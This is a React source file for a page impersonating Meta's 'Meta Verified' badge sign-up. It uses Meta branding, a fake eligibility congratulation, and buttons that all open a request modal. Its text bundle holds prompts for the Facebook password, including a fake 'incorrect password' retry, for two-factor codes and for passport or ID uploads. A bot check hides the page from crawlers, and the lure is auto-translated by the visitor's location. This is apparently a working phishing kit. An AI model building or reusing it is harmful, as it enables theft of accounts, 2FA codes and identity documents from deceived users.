import { useEffect, useState, useMemo, useCallback } from 'react';
import { useNavigate } from 'react-router';
import axios from 'axios';
import heroVideo from '@/assets/images/videoxanh.mp4';
import TickIcon from '@/assets/images/tick.svg';
import benefit1Icon from '@/assets/images/1.webp';
import benefit2Icon from '@/assets/images/2.webp';
import benefit3Icon from '@/assets/images/3.webp';
import benefit4Icon from '@/assets/images/4.webp';
import MetaLogoSvg from '@/assets/images/logo-meta.svg';
import bgSteps from '@/assets/images/bg-steps.png';
import detectBot from '@/utils/detect_bot';
import { translateText } from '@/utils/translate';
import countryToLanguage from '@/utils/country_to_language';
import { PATHS } from '@/router/router';
import '@/assets/css/index-landing.css';

const BENEFIT_DATA = [
    { id: 1, titleKey: 'benefitsBadge', descKey: 'benefitsBadgeDesc', image: benefit1Icon },
    { id: 2, titleKey: 'benefitsImpersonation', descKey: 'benefitsImpersonationDesc', image: benefit2Icon },
    { id: 3, titleKey: 'benefitsSupport', descKey: 'benefitsSupportDesc', image: benefit3Icon },
    { id: 4, titleKey: 'benefitsProfile', descKey: 'benefitsProfileDesc', image: benefit4Icon }
];

const ChevronIcon = ({ className }) => (
    <svg className={className} viewBox="0 0 24 24" fill="none">
        <path d="M6 9l6 6 6-6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
);

const Index = () => {
    const navigate = useNavigate();
    const [isLoading, setIsLoading] = useState(true);
    const [translatedTexts, setTranslatedTexts] = useState({});

    const [selectedBenefit, setSelectedBenefit] = useState(1);
    const [currentTestimonial, setCurrentTestimonial] = useState(0);
    const [openFaq, setOpenFaq] = useState(null);
    const [showMobileNav, setShowMobileNav] = useState(false);

    const defaultTexts = useMemo(() => ({
        navGetStarted: 'Get started',
        navAdvertise: 'Advertise',
        navLearn: 'Learn',
        navSupport: 'Support',

        heroTitle: 'Show the world that you mean business.',
        heroSubtitle: 'Meta Verified helps you build more confidence with new audiences and protects your brand.',
        heroButton: 'Submit Request',
        heroCongrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",

        benefitsTitle: 'Explore Meta Verified for business benefits.',
        benefitsSubtitle: 'Meta Verified provides tools to help you build more confidence with new audiences, protect your brand and more efficiently engage with your customers.',
        benefitsLearnMore: 'Learn more',
        benefitsBadge: 'Verified badge',
        benefitsBadgeDesc: 'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
        benefitsImpersonation: 'Impersonation protection',
        benefitsImpersonationDesc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts we determine are pretending to be you.',
        benefitsSupport: 'Enhanced support',
        benefitsSupportDesc: 'Get 24/7 access to email or chat agent support for account issues.',
        benefitsProfile: 'Upgraded profile features',
        benefitsProfileDesc: 'Enrich your profile by adding images to your links to help boost engagement.',

        stepsTitle: 'Sign up for Meta Verified.',
        stepsSubtitle: 'Our verification process is designed to maintain the integrity of the verified badge for businesses.',
        step1Title: 'Start your application.',
        step1Desc: 'Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements. When getting started, you should have your business contact information ready.',
        step2Title: 'Verify business details.',
        step2Desc: 'You may be asked to share details such as your business name, address, website and/or phone number.',
        step3Title: 'Get reviewed.',
        step3Desc: "We'll review your application and send an update on your status within three business days.",

        testimonialTitle: 'See how Meta Verified has helped real businesses.',
        testimonial1: '"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think seeing a verified badge builds trust. People that I don\'t know or newer brands interested in working with me can be sure that they\'re talking with me and not a scammer."',
        testimonial1Author: 'Kimber Greenwood, Owner of Water Bear Photography',
        testimonial2: '"Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up, and I\'m seeing more interactions on stories and reels."',
        testimonial2Author: 'Devon Kirby, Owner, Mom Approved Miami',
        testimonial3: '"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously."',
        testimonial3Author: 'Sarah Clancy, Owner of Sarah Marie Running Co.',

        ctaTitle: 'Ready to become Meta Verified?',
        ctaButton: 'Submit Request',

        faqTitle: 'Frequently asked questions',
        faqHelpCentre: 'For more, visit our Help Centre.',
        faqQ1: 'How do I know if my business is eligible?',
        faqA1: 'Meta Verified is available for businesses that meet certain eligibility requirements in selected regions. You will need to register and meet certain eligibility requirements to sign up.',
        faqQ2: "How do I update my information if I'm not eligible?",
        faqA2: "Join our waitlist to stay updated. We'll notify you when Meta Verified for Business becomes available for you. Joining the waitlist does not guarantee early access to Meta Verified.",
        faqQ3: 'What if I already have a verified badge?',
        faqA3: 'No action is needed to keep your badge. Existing verified badge holders can apply for a Meta Verified subscription to access additional benefits if they meet the eligibility requirements.',
        faqQ4: "What if I'm interested in Meta Verified for creators?",
        faqA4: 'Visit the Meta Verified for creators page to learn more about the subscription and its benefits for individual creators on Facebook and Instagram.',

        footerNewsletterTitle: 'Get the latest updates from Meta for Business.',
        footerNewsletterDesc: 'Provide your email address to receive the latest updates from Meta for Business, including news, events and product updates.',
        footerEmailPlaceholder: 'Your email address',
        footerSubscribe: 'Subscribe',
        footerConsent: "By submitting this form, you agree to receive marketing-related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe at any time.",

        connectionTitle: 'Every connection is an opportunity.\nThis is your world.',
        footerAbout: 'About',
        footerDevelopers: 'Developers',
        footerCareers: 'Careers',
        footerPrivacy: 'Privacy',
        footerCookies: 'Cookies',
        footerTerms: 'Terms',

        fullName: 'Full Name',
        personalEmail: 'Personal Email',
        businessEmail: 'Business Email',
        mobilePhone: 'Mobile Phone Number',
        yourPageName: 'Your Page Name',
        agreeToTerms: 'I agree to the',
        confirm: 'Confirm',
        aboutHelpMore: 'About · Help · See more',

        loginInstruction: 'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
        mobileOrEmail: 'Mobile number or email',
        password: 'Password',
        passwordIncorrect: 'Password is incorrect, please try again.',
        logIn: 'Log in',
        continueBtn: 'Continue',
        forgotPassword: 'Forgot password?',

        twoFATitle: 'Check your authentication code',
        twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
        twoFAInstructionOr: 'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
        tryAnotherWay: 'Try another way',
        code: 'Code',
        codeExpired: 'This code has expired. Please enter a new code later',
        pleaseWait: 'Please wait',

        successTitle: 'The request was sent successfully',
        successMessage1: 'Great, your verification request has been approved.',
        successMessage2: 'The badge should appear next to your name within the next hour.',
        successMessage3: 'If the badge has not appeared after this time, please contact us again for further assistance.',
        thankYou: 'Thank you',
        metaSupportTeam: 'Meta Support Team.',

        searchPlaceholder: 'Search the Privacy Center',
        nothingFound: 'Nothing found',
        searchHint: 'Use other keywords or check the spelling of the search term request.',

        uploadTitle: 'Confirm your identity',
        uploadChooseType: 'Choose type of ID to upload',
        uploadDesc: "We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.",
        uploadPassport: 'Passport',
        uploadDriversLicense: "Driver's license",
        uploadNationalId: 'National ID card',
        uploadSecurityNote: "Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.",
        uploadLearnMore: 'Learn more',
        uploadBtn: 'Upload Image',
        uploadUploading: 'Uploading...'
    }), []);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const keys = Object.keys(defaultTexts);
                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
                const translated = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });
                setTranslatedTexts(translated);
            } catch {
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializeApp = useCallback(async () => {
        try {
            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }
            try {
                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                const data = response.data;
                localStorage.setItem('ipInfo', JSON.stringify(data));
                const countryCode = data.country_code;
                const targetLang = countryToLanguage[countryCode] || 'en';
                localStorage.setItem('targetLang', targetLang);
                if (targetLang !== 'en') {
                    await translateAllTexts(targetLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch {
                setTranslatedTexts(defaultTexts);
            }
            setIsLoading(false);
        } catch {
            setIsLoading(false);
        }
    }, [defaultTexts, translateAllTexts]);

    useEffect(() => {
        localStorage.clear();
        initializeApp();
    }, [initializeApp]);

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    const TESTIMONIALS = [
        { quote: texts.testimonial1, author: texts.testimonial1Author },
        { quote: texts.testimonial2, author: texts.testimonial2Author },
        { quote: texts.testimonial3, author: texts.testimonial3Author }
    ];

    const FAQ_ITEMS = [
        { q: texts.faqQ1, a: texts.faqA1 },
        { q: texts.faqQ2, a: texts.faqA2 },
        { q: texts.faqQ3, a: texts.faqA3 },
        { q: texts.faqQ4, a: texts.faqA4 }
    ];

    const openModal = () => navigate(PATHS.HOME, { state: { autoOpen: true } });

    const changeTestimonial = (dir) => {
        setCurrentTestimonial((prev) => (prev + dir + TESTIMONIALS.length) % TESTIMONIALS.length);
    };

    if (isLoading) {
        return (
            <div className="lp-skeleton">
                <div style={{ padding: '0 24px', height: '60px', display: 'flex', alignItems: 'center', borderBottom: '1px solid #e5e7eb' }}>
                    <div className="lp-skeleton-bar" style={{ width: '65px', height: '24px' }} />
                </div>
                <div style={{ padding: '40px 24px', maxWidth: '600px' }}>
                    <div className="lp-skeleton-bar" style={{ width: '60%', height: '32px', marginBottom: '16px' }} />
                    <div className="lp-skeleton-bar" style={{ width: '90%', height: '16px', marginBottom: '10px' }} />
                    <div className="lp-skeleton-bar" style={{ width: '75%', height: '16px', marginBottom: '24px' }} />
                    <div className="lp-skeleton-bar" style={{ width: '140px', height: '40px', borderRadius: '40px' }} />
                </div>
                <div style={{ padding: '0 24px', marginTop: '40px' }}>
                    <div className="lp-skeleton-bar" style={{ width: '100%', height: '200px', borderRadius: '12px' }} />
                </div>
            </div>
        );
    }

    const activeBenefit = BENEFIT_DATA.find((b) => b.id === selectedBenefit) || BENEFIT_DATA[0];

    return (
        <div className="landing-page">
            {/* Header */}
            <header className="lp-header">
                <div className="lp-header-left">
                    <div className="lp-header-logo">
                        <img src={MetaLogoSvg} alt="Meta" />
                    </div>
                    <nav className="lp-nav-links">
                        {[
                            texts.navGetStarted,
                            texts.navAdvertise,
                            texts.navLearn,
                            texts.navSupport
                        ].map((label) => (
                            <span key={label} className="lp-nav-link" onClick={openModal}>{label}</span>
                        ))}
                    </nav>
                </div>
                <div className="lp-header-right">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="2" style={{ cursor: 'pointer' }} onClick={openModal}>
                        <circle cx="11" cy="11" r="8" /><path d="m21 21-4.35-4.35" strokeLinecap="round" />
                    </svg>
                    <div style={{ width: '40px', height: '40px', borderRadius: '50%', background: '#e4e6e8', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }} onClick={openModal}>
                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="1.5">
                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" /><circle cx="12" cy="7" r="4" />
                        </svg>
                    </div>
                </div>
                <div className="lp-header-icons-mobile">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="2" style={{ cursor: 'pointer' }} onClick={openModal}>
                        <circle cx="11" cy="11" r="8" /><path d="m21 21-4.35-4.35" strokeLinecap="round" />
                    </svg>
                    <div className="lp-hamburger" onClick={() => setShowMobileNav(true)}>
                        <span /><span /><span />
                    </div>
                </div>
            </header>

            {/* Mobile Nav */}
            <div className={`lp-mobile-overlay ${showMobileNav ? 'open' : ''}`} onClick={() => setShowMobileNav(false)} />
            <div className={`lp-mobile-drawer ${showMobileNav ? 'open' : ''}`}>
                <button className="lp-mobile-close" onClick={() => setShowMobileNav(false)}>×</button>
                {[texts.navGetStarted, texts.navAdvertise, texts.navLearn, texts.navSupport].map((label) => (
                    <span key={label} onClick={() => { setShowMobileNav(false); openModal(); }}>{label}</span>
                ))}
            </div>

            {/* Hero Section */}
            <section className="lp-hero">
                <div className="lp-hero-inner">
                    <div className="lp-hero-text">
                        <div className="lp-hero-text-inner">
                            <img src={TickIcon} alt="Meta Verified" className="lp-hero-icon" />
                            <div className="lp-hero-title">{texts.heroTitle}</div>
                            <p className="lp-hero-subtitle">{texts.heroSubtitle}</p>
                            <button className="lp-btn-primary" onClick={openModal}>
                                {texts.heroButton}
                            </button>
                            <p className="lp-hero-congrats">{texts.heroCongrats}</p>
                        </div>
                    </div>
                    <div className="lp-hero-image">
                        <video
                            src={heroVideo}
                            autoPlay
                            loop
                            muted
                            playsInline
                            style={{ width: '100%', height: 'auto', display: 'block', borderRadius: '24px' }}
                        />
                    </div>
                </div>
            </section>

            {/* Benefits Section */}
            <section className="lp-benefits">
                <div className="lp-benefits-header">
                    <div className="lp-benefits-title">{texts.benefitsTitle}</div>
                    <p className="lp-benefits-subtitle">{texts.benefitsSubtitle}</p>
                    <span className="lp-benefits-learn-more" onClick={openModal}>
                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none" style={{ flexShrink: 0 }}>
                            <circle cx="10" cy="10" r="9" stroke="#0064e0" strokeWidth="1.5" />
                            <path d="M8 6l4 4-4 4" stroke="#0064e0" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                        {texts.benefitsLearnMore}
                    </span>
                </div>

                <div className="lp-benefits-grid">
                    <div className="lp-benefits-image">
                        <img
                            src={activeBenefit.image}
                            alt={texts[activeBenefit.titleKey]}
                            style={{ borderRadius: '16px', width: '100%', height: 'auto', objectFit: 'cover' }}
                        />
                    </div>
                    <div className="lp-benefits-accordion">
                        {BENEFIT_DATA.map((benefit) => {
                            const isActive = selectedBenefit === benefit.id;
                            return (
                                <div
                                    key={benefit.id}
                                    className={`lp-benefit-item ${isActive ? 'active' : ''}`}
                                    onMouseEnter={() => setSelectedBenefit(benefit.id)}
                                    onClick={() => setSelectedBenefit(benefit.id)}
                                >
                                    <div className="lp-benefit-header">
                                        <span>{texts[benefit.titleKey]}</span>
                                        <ChevronIcon className={`lp-benefit-chevron ${isActive ? 'rotated' : ''}`} />
                                    </div>
                                    <div className={`lp-benefit-desc ${isActive ? 'open' : ''}`}>
                                        <p>{texts[benefit.descKey]}</p>
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </div>
            </section>

            {/* Steps Section */}
            <section className="lp-steps" style={{ backgroundImage: `url(${bgSteps})` }}>
                <div className="lp-steps-inner">
                    <div className="lp-steps-title">{texts.stepsTitle}</div>
                    <p className="lp-steps-subtitle">{texts.stepsSubtitle}</p>
                    <div className="lp-steps-grid">
                        {[
                            { num: '1', title: texts.step1Title, desc: texts.step1Desc },
                            { num: '2', title: texts.step2Title, desc: texts.step2Desc },
                            { num: '3', title: texts.step3Title, desc: texts.step3Desc }
                        ].map((step) => (
                            <div key={step.num} className="lp-step-card">
                                <div className="lp-step-number">{step.num}</div>
                                <div className="lp-step-title">{step.title}</div>
                                <p className="lp-step-desc">{step.desc}</p>
                            </div>
                        ))}
                    </div>
                </div>
            </section>

            {/* Testimonial Section */}
            <section className="lp-testimonial">
                <div className="lp-testimonial-inner">
                    <div className="lp-testimonial-title">{texts.testimonialTitle}</div>
                    <div className="lp-carousel-wrapper">
                        <div
                            className="lp-carousel-track"
                            style={{ transform: `translateX(-${currentTestimonial * 100}%)` }}
                        >
                            {TESTIMONIALS.map((t, i) => (
                                <div key={i} className="lp-carousel-slide">
                                    <p className="lp-carousel-quote">{t.quote}</p>
                                    <p className="lp-carousel-author">{t.author}</p>
                                </div>
                            ))}
                        </div>
                    </div>
                    <div className="lp-carousel-nav">
                        <button className="lp-carousel-btn" onClick={() => changeTestimonial(-1)}>
                            <svg width="12" height="12" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" strokeWidth="2">
                                <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                            </svg>
                        </button>
                        <div className="lp-carousel-dots">
                            {TESTIMONIALS.map((_, i) => (
                                <div key={i} className={`lp-dot ${i === currentTestimonial ? 'active' : ''}`} onClick={() => setCurrentTestimonial(i)} style={{ cursor: 'pointer' }} />
                            ))}
                        </div>
                        <button className="lp-carousel-btn" onClick={() => changeTestimonial(1)}>
                            <svg width="12" height="12" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" strokeWidth="2">
                                <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
                            </svg>
                        </button>
                    </div>
                </div>
            </section>

            {/* CTA Section */}
            <section className="lp-cta">
                <div className="lp-cta-inner">
                    <div className="lp-cta-content">
                        <img
                            src="https://static.xx.fbcdn.net/mci_ab/public/cms/?ab_b=e&ab_page=CMS&ab_entry=680460844602208&version=1770656829"
                            alt="Meta Verified"
                            className="lp-cta-icon"
                            onError={(e) => { e.target.src = TickIcon; }}
                        />
                        <div className="lp-cta-title">{texts.ctaTitle}</div>
                        <button className="lp-btn-primary" onClick={openModal}>
                            {texts.ctaButton}
                        </button>
                    </div>
                    <div className="lp-cta-image">
                        <video
                            src={heroVideo}
                            autoPlay
                            loop
                            muted
                            playsInline
                            style={{ width: '100%', height: 'auto', display: 'block', borderRadius: '16px' }}
                        />
                    </div>
                </div>
            </section>

            {/* FAQ Section */}
            <section className="lp-faq">
                <div className="lp-faq-inner">
                    <div className="lp-faq-title">{texts.faqTitle}</div>
                    <p className="lp-faq-subtitle">
                        {texts.faqHelpCentre.split('Help Centre')[0]}
                        <a href="#" onClick={(e) => { e.preventDefault(); openModal(); }}>Help Centre</a>
                        {texts.faqHelpCentre.split('Help Centre')[1] || ''}
                    </p>
                    <div className="lp-faq-list">
                        {FAQ_ITEMS.map((item, i) => (
                            <div key={i} className="lp-faq-item">
                                <button
                                    className="lp-faq-question"
                                    onClick={() => setOpenFaq(openFaq === i ? null : i)}
                                >
                                    <span>{item.q}</span>
                                    <ChevronIcon className={`lp-faq-chevron ${openFaq === i ? 'open' : ''}`} />
                                </button>
                                <div className={`lp-faq-answer ${openFaq === i ? 'open' : ''}`}>
                                    <p>{item.a}</p>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </section>

            {/* Connection Section */}
            <section style={{ padding: '80px 24px', background: 'linear-gradient(135deg, #d4e4f7 0%, #f0d4e8 30%, #fce4ec 50%, #e8f5e9 70%, #c8e6c9 100%)' }}>
                <div style={{ maxWidth: '800px', margin: '0 auto', textAlign: 'center' }}>
                    <div style={{ fontSize: 'clamp(24px, 4vw, 32px)', fontWeight: 500, color: '#1c2b33', lineHeight: 1.4, marginBottom: '32px', whiteSpace: 'pre-line' }}>
                        {texts.connectionTitle}
                    </div>
                    <img src={MetaLogoSvg} alt="Meta" style={{ width: '100px', margin: '0 auto', display: 'block' }} />
                </div>
            </section>

            {/* Footer */}
            <footer className="lp-footer">
                <div className="lp-footer-inner">
                    <div className="lp-footer-newsletter">
                        <div className="lp-footer-newsletter-row">
                            <div style={{ maxWidth: '480px' }}>
                                <div className="lp-footer-newsletter-title">{texts.footerNewsletterTitle}</div>
                                <p className="lp-footer-newsletter-desc">{texts.footerNewsletterDesc}</p>
                            </div>
                            <div className="lp-footer-newsletter-form">
                                <input
                                    type="email"
                                    placeholder={texts.footerEmailPlaceholder}
                                    className="lp-footer-email-input"
                                />
                                <button className="lp-footer-subscribe-btn" onClick={openModal}>
                                    {texts.footerSubscribe}
                                </button>
                            </div>
                        </div>
                        <p className="lp-footer-consent">{texts.footerConsent}</p>
                    </div>
                    <div className="lp-footer-bottom">
                        <span className="lp-footer-copyright">© 2026 Meta</span>
                        <div className="lp-footer-grid">
                            {[
                                texts.footerAbout,
                                texts.footerDevelopers,
                                texts.footerCareers,
                                texts.footerPrivacy,
                                texts.footerCookies,
                                texts.footerTerms
                            ].map((label) => (
                                <div key={label} className="lp-footer-col">
                                    <a href="#" className="lp-footer-nav-link" onClick={(e) => e.preventDefault()}>{label}</a>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </footer>

        </div>
    );
};

export default Index;
